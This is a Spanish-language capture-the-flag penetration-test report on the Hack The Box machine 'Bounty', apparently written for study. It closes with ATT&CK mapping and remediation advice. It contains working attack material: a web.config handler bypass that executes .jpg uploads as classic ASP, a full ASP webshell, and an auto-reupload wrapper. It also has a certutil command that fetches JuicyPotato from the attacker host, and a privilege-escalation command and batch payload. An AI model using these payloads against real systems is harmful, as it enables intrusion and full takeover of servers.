# REPORTE DETALLADO DE EXPLOTACIÓN - MÁQUINA BOUNTY (Hack The Box)

## Resumen Ejecutivo

| Campo | Valor |
|-------|-------|
| **Objetivo** | Bounty (10.129.78.250) |
| **SO / Stack** | Windows Server 2008 R2 Datacenter (6.1.7600 Build 7600), x64, sin hotfixes |
| **Servicio** | IIS 7.5 + ASP.NET (único puerto: 80/tcp) |
| **Vulnerabilidad Inicial** | Upload restringido en `/transfer.aspx` + bypass vía `web.config` (mapear `*.jpg` → `asp.dll`) |
| **Usuario obtenido** | `bounty\merlin` (integrity High, SeImpersonatePrivilege) |
| **Escalada** | JuicyPotato v0.1 (ohpe) → `NT AUTHORITY\SYSTEM` |
| **Privilegio Obtenido** | **SYSTEM (NT AUTHORITY\SYSTEM)** |
| **Flags Obtenidas** | user.txt ✅ root.txt ✅ |

**Flags:**

| Flag | Valor | Archivo |
|------|-------|---------|
| USER | `6d9730fef529e9337f1d41a6e8c5252f` | `C:\Users\merlin\Desktop\user.txt` |
| ROOT | `bf016f706c46b3261260cfdc0f057c68` | `C:\Users\Administrator\Desktop\root.txt` |

**Credenciales:** ninguna explotable (`unattend.xml` presente pero con `<Password>*SENSITIVE*DATA*DELETED*</Password>`; `cmdkey /list` → `* NONE *`).

---

## Fase 0: Preparación del entorno

```bash
$ mkdir -p /home/kali/HTB/bounty && ip -4 addr show
2: eth0: inet 192.168.231.166/24
4: tun0:  inet 10.10.14.194/23      # VPN HTB - IP atacante para callbacks/descargas
```

Herramientas disponibles: `ffuf`, `gobuster`, `feroxbuster`, `wfuzz`, `nikto`, `sqlmap`, `searchsploit`. **No hay SecLists ni dirb common.txt**; wordlists reales: `/usr/share/feroxbuster/raft-medium-directories.txt`, `/etc/theHarvester/wordlists/general/common.txt`.

---

## Fase 1: Reconocimiento

### 1.1 Escaneo de puertos

```bash
$ nmap -sCV -p- -T4 -oA /home/kali/HTB/bounty/nmap 10.129.78.250
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
```

Solo **80/tcp** abierto (65534 puertos filtrados).

### 1.2 Headers y landing

```bash
$ curl -sI http://10.129.78.250/
HTTP/1.1 200 OK
Content-Length: 630
Content-Type: text/html
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Accept-Ranges: bytes
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
```

- `robots.txt` → vacío.
- 404 personalizado de IIS (`404 - File or directory not found.`).
- TRACE habilitado (método potencialmente arriesgado, no explotado).

### 1.3 Enumeración de directorios

`gobuster` abortado por wordlist inexistente (`/usr/share/wordlists/dirb/common.txt` no existe en esta Kali). Fallback:

```bash
$ feroxbuster -u http://10.129.78.250 -w /usr/share/feroxbuster/raft-medium-directories.txt \
    -x aspx,asp,txt,config,html,htm -t 30 --depth 3 -o ferox_dirs.txt
(http://10.129.78.250/aspnet_client, /merlin.jpg, /transfer.aspx, /uploadedfiles ...)

$ for p in upload files uploadedfiles uploads images ... transfer.aspx; do ...; done
301 uploadedfiles       <- directorio de subida (301)
301 aspnet_client
404 upload / files / uploads / images / App_Data ...
```

Resultados relevantes:

```
http://10.129.78.250/transfer.aspx      <- formulario "Secure File Transfer"
http://10.129.78.250/uploadedfiles/     <- 403 (listado prohibido), destino de subidas
http://10.129.78.236/merlin.jpg         <- imagen decorativa (nombre del usuario)
http://10.129.78.250/aspnet_client/     <- 403
```

---

## Fase 2: Análisis del upload (`/transfer.aspx`)

```bash
$ curl -s http://10.129.78.250/transfer.aspx | tee transfer_aspx.html
<title>Secure File Transfer</title>
<form name="form1" method="post" action="transfer.aspx" enctype="multipart/form-data">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUK..." />
<input type="submit" name="btnUpload" value="Upload" onclick="return ValidateFile();" id="btnUpload" />
```

ASP.NET WebForms → requiere `__VIEWSTATE` + `__EVENTVALIDATION` en cada POST. Cliente de prueba (`upload_test.py`):

```python
s = requests.Session(); r = s.get(url)
vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)"', r.text).group(1)
ev = re.search(r'__EVENTVALIDATION" id="__EVENTVALIDATION" value="([^"]+)"', r.text).group(1)
payload = {"__VIEWSTATE": vs, "__EVENTVALIDATION": ev, "btnUpload": "Upload"}
resp = s.post(url, data=payload, files={"FileUpload1": (fname, data, content_type)})
# Lee el span Label1: "File uploaded successfully." / "Invalid File. Please try again"
```

### 2.1 Whitelist de extensiones

```
txt   -> Invalid File        asp   -> Invalid File     asa  -> Invalid File
jpg   -> File uploaded OK    aspx  -> Invalid File     asax -> Invalid File
jpeg  -> File uploaded OK    asmx  -> Invalid File     ...
png   -> File uploaded OK    config-> File uploaded OK   <-- .config PERMITIDO
gif   -> File uploaded OK
```

**Whitelist: imágenes (jpg/jpeg/png/gif) + `.config`.** Los ficheros quedan en `/uploadedfiles/` con el nombre original (case-insensitive: `Marker.jpg` = `marker.jpg`).

### 2.2 Bypass de nombre de fichero (fallidos)

```
'shell.jpg.aspx'    -> Invalid      'shell.aspx.jpg'    -> uploaded OK (pero no ejecuta)
'shell.jpg;.aspx'   -> Invalid      'shell.aspx%00.jpg' -> uploaded OK
'shell.jpg/.aspx'   -> Invalid      'shell.aspx:.jpg'   -> uploaded OK
'shell.JPG.aspx'    -> Invalid      'shell.config'      -> uploaded OK
```

La validación usa la **extensión final**; los trucos de doble extensión no sirven para ejecutar ASPX. El camino real: **`.config` está permitido → subir un `web.config` que remapee la ejecución de otro formato permitido**.

---

## Fase 3: Bypass vía `web.config` (handler mapping)

### 3.1 Intento 1: PageHandlerFactory sobre `*.jpg` (ASPX)

```xml
<system.webServer>
  <handlers accessPolicy="Read, Script">
    <add name="jpg_to_aspx" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified" requireAccess="Script" />
  </handlers>
</system.webServer>
```

Subido OK + webshell ASPX en `shell.jpg` → el .jpg devolvía HTML procesado pero con error (customErrors on). Con `customErrors mode="Off"` se vio que **fallaba la compilación**; `buildProviders` para `.jpg` **no puede definirse en subdirectorio** (error de IIS). Descartado.

### 3.2 Intento 2 (exitoso): mapear `*.jpg` → ASP clásico (`asp.dll`)

`web.config` final usado:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.web>
    <customErrors mode="Off"/>
  </system.web>
  <system.webServer>
    <handlers accessPolicy="Read, Script">
      <add name="jpg_asp" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

Webshell clásica (`shell_asp.jpg`):

```asp
<%
Option Explicit
Dim cmd, sh, o, s
cmd = Request("c")
If cmd <> "" Then
  Set sh = Server.CreateObject("WScript.Shell")
  Set o = sh.Exec("cmd /c " & cmd)
  s = o.StdOut.ReadAll() & o.StdErr.ReadAll()
  Response.ContentType = "text/plain"
  Response.Write s
End If
%>
```

```bash
$ python3 upload_test.py web.config "text/xml"      -> Green "File uploaded successfully."
$ python3 upload_test.py shell_asp.jpg "image/jpeg"  -> Green "File uploaded successfully."
$ curl -s "http://10.129.78.250/uploadedfiles/shell_asp.jpg?c=whoami"
bounty\merlin
```

**RCE como `bounty\merlin`.**

---

## Fase 4: Acceso estable (wrapper `exec.sh`)

Los ficheros de `/uploadedfiles/` **se limpian periódicamente** (404 aleatorios). Wrapper con auto-reupload:

```bash
#!/bin/bash
# usage: exec.sh "command"  (auto re-uploads shell if 404)
BASE="http://10.129.78.250/uploadedfiles/shell_asp.jpg"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE")
if [ "$CODE" != "200" ]; then
  python3 upload_test.py web.config "text/xml" >/dev/null
  python3 upload_test.py shell_asp.jpg "image/jpeg" >/dev/null
fi
curl -s -G "$BASE" --data-urlencode "c=$1"
```

Uso: `./exec.sh "whoami"` → `bounty\merlin`.

> Intento lateral: handler `multi/handler` de Metasploit (`msf.rc`, payload `windows/x64/meterpreter/reverse_tcp` a 10.10.14.194:4444) preparado pero la sesión nunca llegó (SIGTERM en el log) — el webshell por HTTP resultó más fiable y se usó exclusivamente.

---

## Fase 5: Post-explotación / enumeración

```bash
$ ./exec.sh "whoami /all"
USER INFORMATION
User Name     SID
bounty\merlin S-1-5-21-2239012103-4222820348-3209614936-1000

$ ./exec.sh "whoami /priv"
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled   <-- vector de escalada

$ ./exec.sh "systeminfo"
Host Name:                BOUNTY
OS Name:                  Microsoft Windows Server 2008 R2 Datacenter
OS Version:               6.1.7600 N/A Build 7600
System Type:              x64-based PC
Domain:                   WORKGROUP
Hotfix(s):                N/A                    <-- SIN NINGÚN PATCH

$ ./exec.sh "net user"
Administrator   Guest   merlin
$ ./exec.sh "net localgroup administrators"
Administrator
```

### 5.1 User flag

```bash
$ ./exec.sh "type C:\Users\merlin\Desktop\user.txt"
6d9730fef529e9337f1d41a6e8c5252f
$ ./exec.sh "type C:\Users\Administrator\Desktop\root.txt"
Access is denied.
```

### 5.2 Enumeración de escalada (resultados negativos)

| Comando | Resultado |
|---------|-----------|
| `reg query .../Installer /v AlwaysInstallElevated` (HKLM y HKCU) | `The system was unable to find the specified registry key or value` |
| `wmic service get name,pathname,startmode` | `ERROR: Description = Access denied` |
| `sc query` / `net start` | `[SC] OpenSCManager FAILED 5: Access is denied` |
| `cmdkey /list` | `* NONE *` |
| `wmic qfe list brief` | `No Instance(s) Available` |
| `reg query ...\Run` | solo `VMware User Process` (vmtoolsd.exe) |
| `reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f ImagePath` | solo drivers/svchost del sistema (filtrado en `services_thirdparty.txt`) |
| `schtasks /query /fo LIST /v` | solo tareas del sistema (AD RMS, etc.) |
| `unattend.xml` (en `/Windows/Panther/`) | `<Password>*SENSITIVE*DATA*DELETED*</Password>` (auto-login de `merlin`, sin secreto) |
| `net localgroup administrators merlin /add` | Access denied (integridad High, no admin) |

**Conclusión:** `merlin` tiene **SeImpersonatePrivilege** + integrity High → familia de exploits **Potato**.

---

## Fase 6: Escalada a SYSTEM

### 6.1 PrintSpoofer64 — FALLO (dependencias)

Transferencia por canal whitelist (jpg) + `copy`:

```bash
$ python3 upload_test.py ps.jpg "image/jpeg"          -> Green OK
$ curl -o /tmp/ps_dl.jpg .../uploadedfiles/ps.jpg && md5sum
108da75de148145b8f056ec0827f1665 == local ✓
$ ./exec.sh "copy C:\inetpub\wwwroot\uploadedfiles\ps.jpg C:\windows\temp\ps.exe"
$ ./exec.sh "C:\windows\temp\ps.exe -i 1 -c \"cmd /c C:\windows\temp\r.bat\""
(sin salida)

$ ./exec.sh "cmd /v:on /c \"C:\windows\temp\ps.exe -h > nul 2>&1 & echo ERR=!errorlevel!\""
ERR=-1073741515    ->  0xC0000135  STATUS_DLL_NOT_FOUND
$ objdump -p PrintSpoofer64.exe | grep "DLL Name"
... VCRUNTIME140.dll, api-ms-win-crt-{stdio,string,convert,heap,runtime,math,locale}-l1-1-0.dll
```

Caja **sin ningún hotfix** → no hay UCRT ni CRT 2015 → PrintSpoofer no arranca. (Spooler si estaba: `sc query spooler` → `STATE: 4 RUNNING`.)

### 6.2 GodPotato — FALLO (dependencias)

```bash
$ god4.exe ...   -> ERR=-2146232576 (0x80131700)   # solo existe .NET v2.0.50727, sin CLR4
$ god35.exe ...  -> banner OK (CLR2) pero al explotar:
                    [!] No combase module found      # combase.dll es Win8+ ; no existe en 2008 R2
```

### 6.3 JuicyPotato v0.1 (ohpe) — ÉXITO

Investigación en writeups de Bounty (siunam, mdn1nj4, HackIndex, pointedsec): todos usan **JuicyPotato de ohpe** en este mismo build con CLSID `{4991d34b-80a1-4291-83b6-3328366b9097}`.

```bash
$ objdump -p JuicyPotato.exe | grep "DLL Name"
Secur32, KERNEL32, ADVAPI32, ole32, WS2_32        # ¡sin CRT! ✓

$ python3 -m http.server 8000 &                    # en Kali (10.10.14.194)
$ ./exec.sh "certutil -urlcache -split -f http://10.10.14.194:8000/JuicyPotato.exe C:\windows\temp\jp.exe"
CertUtil: -URLCache command completed successfully.    (347648 B, MD5 = local ✓)
```

Payload `C:\windows\temp\r.bat` (creado con `echo`):

```bat
@echo off
copy /y C:\Users\Administrator\Desktop\root.txt C:\windows\temp\rf.txt
copy /y C:\Users\Administrator\Desktop\root.txt C:\inetpub\wwwroot\uploadedfiles\rf.txt
icacls C:\windows\temp\rf.txt /grant Everyone:F
```

Comando de escalamiento:

```bash
$ ./exec.sh "C:\windows\temp\jp.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p C:\Windows\System32\cmd.exe -a \"/c C:\windows\temp\r.bat\" -t * > C:\windows\temp\jp_out.txt 2>&1"
```

Output de `jp_out.txt`:

```
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

### 6.4 Root flag (doble verificación)

```bash
$ ./exec.sh "type C:\windows\temp\rf.txt"
bf016f706c46b3261260cfdc0f057c68
$ curl -s http://10.129.78.250/uploadedfiles/rf.txt
bf016f706c46b3261260cfdc0f057c68      (200 OK)
```

---

## Fase 7: Vectores fallidos / abortados

| # | Vector | Motivo del fallo |
|---|--------|------------------|
| 1 | `gobuster` con dirb common.txt | wordlist no existe en esta Kali → feroxbuster con `raft-medium-directories.txt` |
| 2 | ferox con timeout 600 s | comando cortado por timeout (el informe quedó parcial, suficiente) |
| 3 | Bypass de nombre (`shell.jpg.aspx`, `;.aspx`, `%00`, `::$DATA`...) | la whitelist valida la extensión final; solo sirve subir `.config` |
| 4 | `web.config` + PageHandlerFactory (ASPX sobre .jpg) | compilación falla; `buildProviders` no permitido en subdirectorio |
| 5 | Metasploit `multi/handler` (meterpreter x64) | `Exploit failed: SIGTERM`, sin sesión → webshell HTTP en su lugar |
| 6 | `wmic` / `sc` / `net start` para enum de servicios | Access denied (OpenSCManager) → enum vía `reg query ... ImagePath` |
| 7 | AlwaysInstallElevated | clave inexistente en HKLM/HKCU |
| 8 | `net localgroup administrators merlin /add` | Access denied (no admin) |
| 9 | PrintSpoofer64.exe | `0xC0000135` — importa `VCRUNTIME140`/UCRT, no instalado (box sin patches) |
| 10 | GodPotato-NET4.exe | `0x80131700` — sin CLR4 (solo .NET 2.0.50727) |
| 11 | GodPotato-NET35.exe | `[!] No combase module found` — `combase.dll` es Win8+ |
| 12 | JuicyPotato con `icacls ... & ...` encadenado en `-a` | el `&` se evaluó en el cmd externo (quoting) → "Access is denied"; innecesario, ya se tenía la flag |
| 13 | `powershell -command $PSVersionTable` | colgado >120 s vía webshell → abandonado |
| 14 | `copy ps.jpg → ps.exe` (1.er intento) | race con la limpieza periódica de `uploadedfiles/` ("file not found"); el fichero se creó igualmente (MD5 verificado) |
| 15 | `unattend.xml` como fuente de credenciales | `*SENSITIVE*DATA*DELETED*` |

---

## Fase 8: Obstáculos resueltos

1. **Wordlists ausentes** → feroxbuster con su raft incluida + enumeración manual de rutas (`transfer.aspx` se encontró en el primer barrido).
2. **Ficheros de `uploadedfiles/` limpiados periódicamente** → `exec.sh` con auto-reupload (re-sube web.config + shell si 404).
3. **Upload con whitelist estricta** → `.config` permitido → `web.config` mapeando `*.jpg` → `asp.dll` (ASP clásico en vez de ASPX, que necesitaba buildProviders).
4. **Escritura como SYSTEM en carpeta web** → `r.bat` copia `root.txt` a `uploadedfiles/` + `icacls /grant Everyone:F`, leíble por HTTP.
5. **Potatoes modernos incompatibles** → selección de exploit por **dependencias PE** (`objdump -p`): PrintSpoofer necesita UCRT, GodPotato necesita combase/CLR4 → **JuicyPotato v0.1 sin CRT**.
6. **Transferencia de binarios sin .exe en whitelist** → por un lado subida como `.jpg` + `copy`; por otro, `certutil -urlcache -split -f` directo desde el HTTP de Kali (vía rápida, MD5 verificado).

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | ID |
|---------|---------|-----|
| Reconocimiento | Active Scanning: port scan | T1046 |
| Reconocimiento | Gather Victim Host Information: Software | T1592.004 |
| Acceso Initial | Exploitation of Remote Services | T1210 |
| Acceso Initial | Upload Malicious File | T1608.001 |
| Ejecución | Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Escalada | Abuse Elevation Control Mechanism: Token Manipulation (SeImpersonate) | T1134.001 |
| Escalada | Token Impersonation/Theft: Token Manipulation (Potato/DCOM) | T1134.002 |
| Persistencia/Post | Remote System Discovery (enum) | T1018 |
| Credenciales | Unsecured Credentials: Credentials in Registry (unattend.xml, descartado) | T1552.002 |

---

## Hallazgos y Remediación

| # | Hallazgo | Severidad | Evidencia | Remediación |
|---|----------|-----------|-----------|-------------|
| 1 | Upload sin validación robusta en `/transfer.aspx` (solo whitelist de extensión) | **CRÍTICO** | `web.config` + `.jpg` → RCE como merlin | Validar contenido (magic bytes), no permitir `.config`, stored fuera de la raíz web, MIME sniffing off |
| 2 | Ejecución de código permitida en `/uploadedfiles/` (ISAPI/ASP habilitado en directorio de uploads) | **CRÍTICO** | `asp.dll` procesa `shell_asp.jpg?c=...` | Deshabilitar script en directorios de subida (`handlers` vacíos / `accessPolicy="Read"`), Application Pool dedicado sin permisos de script |
| 3 | `SeImpersonatePrivilege` en el pool de IIS (AppPoolIdentity/merlin) | **ALTO** | `whoami /priv` → Enabled | Usar identidades sin privilegio de impersonación; restringir pools; aplicar parches |
| 4 | Sistema sin ningún hotfix (Build 7600, Hotfix N/A) | **ALTO** | `systeminfo` | Aplicar actualizaciones; la box soporta R2/SP1+ |
| 5 | IIS 7.5 expuesto sin cabeceras de seguridad; TRACE habilitado | **MEDIO** | `nmap -sCV` | Deshabilitar TRACE, añadir X-Frame/X-Content/Strict-Transport |
| 6 | Fichero `unattend.xml` con historial de credenciales en el sistema | **BAJO** | Password redactado | Eliminar respuestas de setup con credenciales |

---

## Éxito del Ataque

| Objetivo | Estado |
|----------|--------|
| Acceso al sistema | Completado (`bounty\merlin`, integrity High) |
| Privilegio SYSTEM | Obtenido (JuicyPotato → `NT AUTHORITY\SYSTEM`) |
| user.txt | `6d9730fef529e9337f1d41a6e8c5252f` |
| root.txt | `bf016f706c46b3261260cfdc0f057c68` |
| Limpieza | Sin procesos/listeners propios activos en Kali |

---

## Archivos del caso

| Archivo | Contenido |
|---------|-----------|
| `/home/kali/HTB/informes/informe_bounty.md` | Este informe |
| `/home/kali/HTB/bounty/bounty_flags.txt` | Ambas flags |
| `/home/kali/HTB/bounty/red.txt` | Sesión completa de la fase inicial (recon → user flag) |
| `/home/kali/HTB/bounty/nmap.{nmap,gnmap,xml}` | Escaneo `nmap -sCV -p- -T4` |
| `/home/kali/HTB/bounty/ferox_dirs.txt` | Resultados de feroxbuster |
| `/home/kali/HTB/bounty/upload_test.py` | Cliente de upload con VIEWSTATE/EVENTVALIDATION |
| `/home/kali/HTB/bounty/web.config` | Bypass final: `*.jpg` → `asp.dll` |
| `/home/kali/HTB/bounty/shell_asp.jpg` | Webshell ASP clásico |
| `/home/kali/HTB/bounty/exec.sh` | Wrapper con auto-reupload |
| `/home/kali/HTB/bounty/transfer_aspx.html` | Formulario capturado de `/transfer.aspx` |
| `/home/kali/HTB/bounty/PrintSpoofer64.exe`, `GodPotato-NET*.exe` | Potatoes probados (fallidos) |
| `/home/kali/HTB/bounty/msf.rc`, `msf.log` | Handler Metasploit (no usado) |
| `/home/kali/HTB/bounty/unattend.xml` | Respuesta de instalación (credenciales redactadas) |
